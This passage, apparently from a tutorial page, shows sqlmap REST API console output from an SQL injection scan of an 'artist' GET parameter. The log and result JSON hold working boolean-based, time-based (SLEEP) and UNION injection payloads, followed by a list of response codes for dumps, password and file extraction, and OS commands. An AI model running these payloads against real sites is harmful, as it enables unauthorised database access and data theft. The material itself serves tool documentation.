&quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, OR<br />DER BY or GROUP BY clause (UPDATEXML)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, O<br />RDER BY or GROUP BY clause (FLOOR)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 4.1 OR error-based - WHERE, HAVING cla<br />use (FLOOR)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL OR error-based - WHERE or HAVING clause (<br />FLOOR)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (E<br />XTRACTVALUE)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.5 error-based - Parameter replace (B<br />IGINT UNSIGNED)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.5 error-based - Parameter replace (E<br />XP)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.7.8 error-based - Parameter replace <br />(JSON_KEYS)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:12&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.0 error-based - Parameter replace (F<br />LOOR)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.1 error-based - Parameter replace (U<br />PDATEXML)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.1 error-based - Parameter replace (E<br />XTRACTVALUE)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL inline queries&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt; 5.0.11 stacked queries (comment)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt; 5.0.11 stacked queries&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt; 5.0.11 stacked queries (query SLEEP - c<br />omment)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt; 5.0.11 stacked queries (query SLEEP)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &lt; 5.0.12 stacked queries (heavy query - c<br />omment)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &lt; 5.0.12 stacked queries (heavy query)&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;MySQL &gt;= 5.0.12 AND time-based blind&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:13&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;GET parameter &#39;artist&#39; appears to be &#39;MySQL &gt;= 5.0.12 AN<br />D time-based blind&#39; injectable &quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:23&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;testing &#39;Generic UNION query (NULL) - 1 to 20 columns&#39;&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:23&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;automatically extending ranges for UNION query injection<br /> technique tests as there is at least one other (potential) technique found&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:23&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;&#39;ORDER BY&#39; technique appears to be usable. This should r<br />educe the time needed to find the right number of query columns. Automatically e<br />xtending the range for current UNION query injection technique test&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:23&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;target URL appears to have 3 columns in query&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:23&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;GET parameter &#39;artist&#39; is &#39;Generic UNION query (NULL) - <br />1 to 20 columns&#39; injectable&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:24&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;the back-end DBMS is MySQL&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:24&quot;<br />        }, <br />        {<br />            &quot;message&quot;: &quot;fetching banner&quot;, <br />            &quot;level&quot;: &quot;INFO&quot;, <br />            &quot;time&quot;: &quot;12:48:24&quot;<br />        }<br />    ], <br />    &quot;success&quot;: true<br />}<br />api (a42ddaef02e976f0)&gt; data<br />[12:48:59] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/data<br />{<br />    &quot;data&quot;: [<br />        {<br />            &quot;status&quot;: 1, <br />            &quot;type&quot;: 0, <br />            &quot;value&quot;: [<br />                {<br />                    &quot;dbms&quot;: &quot;MySQL&quot;, <br />                    &quot;suffix&quot;: &quot;&quot;, <br />                    &quot;clause&quot;: [<br />                        1, <br />                        9<br />                    ], <br />                    &quot;notes&quot;: [], <br />                    &quot;ptype&quot;: 1, <br />                    &quot;dbms_version&quot;: [<br />                        &quot;&gt;= 5.0.12&quot;<br />                    ], <br />                    &quot;prefix&quot;: &quot;&quot;, <br />                    &quot;place&quot;: &quot;GET&quot;, <br />                    &quot;os&quot;: null, <br />                    &quot;conf&quot;: {<br />                        &quot;code&quot;: null, <br />                        &quot;string&quot;: &quot;hac&quot;, <br />                        &quot;notString&quot;: null, <br />                        &quot;titles&quot;: false, <br />                        &quot;regexp&quot;: null, <br />                        &quot;textOnly&quot;: false, <br />                        &quot;optimize&quot;: false<br />                    }, <br />                    &quot;parameter&quot;: &quot;artist&quot;, <br />                    &quot;data&quot;: {<br />                        &quot;1&quot;: {<br />                            &quot;comment&quot;: &quot;&quot;, <br />                            &quot;matchRatio&quot;: 0.85, <br />                            &quot;trueCode&quot;: 200, <br />                            &quot;title&quot;: &quot;AND boolean-based blind - WHERE or HAVING <br />clause&quot;, <br />                            &quot;templatePayload&quot;: null, <br />                            &quot;vector&quot;: &quot;AND [INFERENCE]&quot;, <br />                            &quot;falseCode&quot;: 200, <br />                            &quot;where&quot;: 1, <br />                            &quot;payload&quot;: &quot;artist=1 AND 2794=2794&quot;<br />                        }, <br />                        &quot;5&quot;: {<br />                            &quot;comment&quot;: &quot;&quot;, <br />                            &quot;matchRatio&quot;: 0.85, <br />                            &quot;trueCode&quot;: 200, <br />                            &quot;title&quot;: &quot;MySQL &gt;= 5.0.12 AND time-based blind&quot;, <br />                            &quot;templatePayload&quot;: null, <br />                            &quot;vector&quot;: &quot;AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLE<br />EPTIME]),[RANDNUM])&quot;, <br />                            &quot;falseCode&quot;: null, <br />                            &quot;where&quot;: 1, <br />                            &quot;payload&quot;: &quot;artist=1 AND SLEEP([SLEEPTIME])&quot;<br />                        }, <br />                        &quot;6&quot;: {<br />                            &quot;comment&quot;: &quot;[GENERIC_SQL_COMMENT]&quot;, <br />                            &quot;matchRatio&quot;: 0.85, <br />                            &quot;trueCode&quot;: null, <br />                            &quot;title&quot;: &quot;Generic UNION query (NULL) - 1 to 20 colum<br />ns&quot;, <br />                            &quot;templatePayload&quot;: null, <br />                            &quot;vector&quot;: [<br />                                2, <br />                                3, <br />                                &quot;[GENERIC_SQL_COMMENT]&quot;, <br />                                &quot;&quot;, <br />                                &quot;&quot;, <br />                                &quot;NULL&quot;, <br />                                2, <br />                                false, <br />                                false<br />                            ], <br />                            &quot;falseCode&quot;: null, <br />                            &quot;where&quot;: 2, <br />                            &quot;payload&quot;: &quot;artist=-5376 UNION ALL SELECT NULL,NULL,<br />CONCAT(0x716b706a71,0x4a754d495377744d4273616c436b4b6a504164666a5572477241596649<br />704c68614672644a477474,0x7162717171)-- aAjy&quot;<br />                        }<br />                    }<br />                }<br />            ]<br />        }, <br />        {<br />            &quot;status&quot;: 1, <br />            &quot;type&quot;: 2, <br />            &quot;value&quot;: &quot;5.1.73-0ubuntu0.10.04.1&quot;<br />        }<br />    ], <br />    &quot;success&quot;: true, <br />    &quot;error&quot;: []<br />}<br />api (a42ddaef02e976f0)&gt; exit<br />$<br /></code><br />General codes used in response JSON data:<br />◇ <code>status</code>:<br /><br /><code>0 - in progress<br />1 - complete<br /></code><br />◇ <code>type</code>:<br /><br /><code>0 - target<br />1 - techniques<br />2 - dbms_fingerprint<br />3 - banner<br />4 - current_user<br />5 - current_db<br />6 - hostname<br />7 - is_dba<br />8 - users<br />9 - passwords<br />10 - privileges<br />11 - roles<br />12 - dbs<br />13 - tables<br />14 - columns<br />15 - schema<br />16 - count<br />17 - dump_table<br />18 - search<br />19 - sql_query<br />20 - common_tables<br />21 - common_columns<br />22 - file_read<br />23 - file_write<br />24 - os_cmd<br />25 - reg_read<br />26 - statements<br /></code><br />◇ <code>returncode</code><br /><br /><code>null - still running<br />0 - ended gracefully<br />1 - general error occurred<br />255 - unhandled exception<br /></code><br /></div></body></html>